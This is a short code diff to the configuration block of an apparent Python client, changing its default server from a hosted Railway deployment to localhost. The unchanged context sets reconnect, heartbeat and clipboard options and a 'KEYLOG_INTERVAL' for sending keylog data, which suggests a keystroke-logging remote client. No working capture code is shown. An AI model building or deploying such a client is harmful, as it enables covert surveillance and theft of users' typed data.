@@ -38,8 +38,8 @@ except ImportError:
         CLIPBOARD_AVAILABLE = False
 
 # Configuration
-SERVER_IP = os.environ.get('SERVER_IP', 'pablosboson-server-production.up.railway.app')  # Default to Railway deployment
-SERVER_PORT = int(os.environ.get('SERVER_PORT', '5000'))  # Must match server.py port
+SERVER_IP = os.environ.get('SERVER_IP', '127.0.0.1')  # Default to localhost for local testing
+SERVER_PORT = int(os.environ.get('SERVER_PORT', '5000'))  # TCP port for client connections
 RECONNECT_DELAY = 10     # Seconds between reconnection attempts
 HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats
 KEYLOG_INTERVAL = 5      # Seconds between keylog data sends
